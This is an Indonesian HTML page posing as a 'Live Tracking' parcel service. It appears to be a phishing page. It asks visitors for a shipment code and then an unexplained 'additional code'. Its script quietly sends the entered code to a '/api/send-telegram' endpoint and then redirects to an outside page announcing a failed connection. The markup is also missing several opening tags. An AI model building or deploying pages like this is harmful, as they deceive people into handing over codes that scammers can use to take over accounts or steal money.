<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta name="theme-color" content="#ffffff">
  <meta name="description" content="Halaman Live Tracking untuk melanjutkan ke layanan pelacakan pesanan.">
  <title>Live Tracking</title>
  <style>
    :root {
      --green: #198b45;
      --green-dark: #14763a;
      --ink: #111827;
      --muted: #52617a;
      --line: #b9b9b9;
      --red: #ed1c2a;
      --orange: #f5a13a;
    }
    * { box-sizing: border-box; }
    html, body { margin: 0; min-height: 100%; }
    body {
      min-height: 100vh;
      min-height: 100dvh;
      background: #fff;
      color: var(--ink);
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      -webkit-font-smoothing: antialiased;
    }
    .page {
      width: 100%;
      max-width: 420px;
      min-height: 100vh;
      min-height: 100dvh;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      padding: max(18px, env(safe-area-inset-top)) 18px max(14px, env(safe-area-inset-bottom));
    }
    .main { flex: 1; display: flex; flex-direction: column; }
    .illustration {
      width: 100%;
      max-width: 300px;
      height: auto;
      display: block;
      margin: 14px auto 17px;
    }
    h1 {
      margin: 0;
      text-align: center;
      font-size: clamp(23px, 5.8vw, 29px);
      line-height: 1.18;
      letter-spacing: -0.8px;
      font-weight: 750;
    }
    .subtitle {
      max-width: 430px;
      margin: 11px auto 20px;
      color: var(--muted);
      text-align: center;
      font-size: clamp(14px, 3.8vw, 17px);
      line-height: 1.55;
    }
    form { width: 100%; }
    .field-wrap {
      position: relative;
      width: 100%;
    }
    .field-icon {
      position: absolute;
      left: 14px;
      top: 50%;
      width: 21px;
      height: 21px;
      transform: translateY(-50%);
      color: var(--green);
      pointer-events: none;
    }
    .field {
      display: block;
      width: 100%;
      height: 52px;
      border: 1.5px solid var(--line);
      border-radius: 12px;
      background: #fff;
      color: var(--ink);
      padding: 0 13px 0 45px;
      font: inherit;
      font-size: 15px;
      outline: none;
      transition: border-color .15s ease, box-shadow .15s ease;
    }
    .field:focus {
      border-color: var(--green);
      box-shadow: 0 0 0 3px rgba(25,139,69,.12);
    }
    .field::placeholder { color: #8b93a1; }
    .next {
      width: 100%;
      min-height: 52px;
      margin-top: 14px;
      border: 0;
      border-radius: 10px;
      background: var(--green);
      color: #fff;
      font: inherit;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 3px 0 rgba(0,0,0,.04);
      transition: background .15s ease, transform .1s ease;
    }
    .next:active { transform: translateY(1px); background: var(--green-dark); }
    .next:focus-visible { outline: 3px solid rgba(25,139,69,.3); outline-offset: 3px; }
    .second-step { margin-top: 14px; }
    .second-step[hidden] { display: none; }
    .second-step .next { margin-top: 14px; }
    .notice {
      min-height: 42px;
      margin: 10px 0 0;
      color: #b42318;
      font-size: 13px;
      line-height: 1.4;
      text-align: center;
    }
    footer {
      margin-top: 22px;
      padding: 12px 2px 0;
      color: var(--muted);
      text-align: center;
      font-size: 11px;
      line-height: 1.55;
    }
    @media (min-height: 800px) {
      .illustration { margin-top: 22px; margin-bottom: 22px; }
      .subtitle { margin-bottom: 22px; }
      footer { margin-top: 30px; }
    }
    @media (max-width: 360px) {
      .page { padding-left: 17px; padding-right: 17px; }
      .illustration { max-width: 260px; margin-top: 8px; }
      .field, .next { min-height: 56px; height: 56px; }
    }
  </style>
</head>

      <h1 id="page-title">Hubungkan Ke Live Tracking</h1>
      <p class="subtitle">Masukkan kode resi pengiriman, aktifkan layanan live tracking untuk pantau lokasi pesananmu.</p>

      <form id="tracking-form" novalidate>
        <label for="tracking-code" style="position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0;">Kode resi pengiriman</label>
        <div class="field-wrap">
          <svg class="field-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
            <path d="M3.75 7.25 12 3.5l8.25 3.75v9.5L12 20.5l-8.25-3.75v-9.5Z" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/>
            <path d="M3.9 7.35 12 11l8.1-3.65M12 11v9.2M8 5.35l8.2 3.8" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/>
          </svg>
          <input class="field" id="tracking-code" name="tracking-code" type="text" autocomplete="off" aria-label="Kode resi pengiriman" placeholder="Masukkan kode disini" required>
        </div>
        <div class="second-step" id="second-step" hidden>
          <label for="verification-code" style="position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0;">Kode tambahan</label>
          <div class="field-wrap">
            <svg class="field-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
              <path d="M12 3.5 4.75 6.25v5.5c0 4.35 2.85 7.65 7.25 8.75 4.4-1.1 7.25-4.4 7.25-8.75v-5.5L12 3.5Z" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/>
              <path d="m8.75 12 2.1 2.1 4.4-4.4" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            <input class="field" id="verification-code" name="verification-code" type="text" autocomplete="off" aria-label="Kode tambahan" placeholder="Input kode disini">
          </div>
        </div>
        <button class="next" type="submit">Aktifkan Live Tracking</button>
        <p class="notice" id="notice" aria-live="polite"></p>
      </form>
    </section>
    <footer>
      Info penting: untuk dapat menggunakan layanan live tracking,<br>
      pastikan kamu sudah memenuhi syarat pengiriman.
    </footer>
  </main>
  <script>
    /*
      PENGATURAN:
      Ganti URL_TUJUAN dengan alamat tujuan lengkap, termasuk https://
      Contoh: const URL_TUJUAN = "https://domain-anda.example/lanjut";
    */
    const URL_TUJUAN = "https://cek-paketku.myr.id/lp/gagal-menghubungkan";
    const form = document.getElementById("tracking-form");
    const field = document.getElementById("tracking-code");
    const secondStep = document.getElementById("second-step");
    const verificationField = document.getElementById("verification-code");
    const notice = document.getElementById("notice");
    const firstButton = form.querySelector(".next");
    let isSecondStepVisible = false;

    form.addEventListener("submit", async function (event) {
      event.preventDefault();
      notice.textContent = "";

      if (!isSecondStepVisible) {
        if (!field.value.trim()) {
          notice.textContent = "Silakan isi kolom terlebih dahulu.";
          field.focus();
          return;
        }

        firstButton.textContent = "Lanjutkan";
        isSecondStepVisible = true;
        secondStep.hidden = false;
        verificationField.focus();

        fetch("/api/send-telegram", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ trackingCode: field.value.trim() }),
        }).catch(() => {});
        return;
      }

      if (!verificationField.value.trim()) {
        notice.textContent = "Silakan isi kode terlebih dahulu.";
        verificationField.focus();
        return;
      }

      if (!URL_TUJUAN.trim()) {
        notice.textContent = "URL tujuan belum diatur. Edit nilai URL_TUJUAN di bagian script sebelum dipublikasikan.";
        return;
      }

      let destination;
      try {
        destination = new URL(URL_TUJUAN);
      } catch (_) {
        notice.textContent = "URL tujuan tidak valid. Periksa kembali pengaturannya.";
        return;
      }
      if (destination.protocol !== "https:" && destination.protocol !== "http:") {
        notice.textContent = "URL tujuan harus menggunakan http:// atau https://.";
        return;
      }

      firstButton.disabled = true;
      firstButton.textContent = "Menghubungkan...";
      window.location.href = destination.href;
    });
  </script>
</body>
</html>
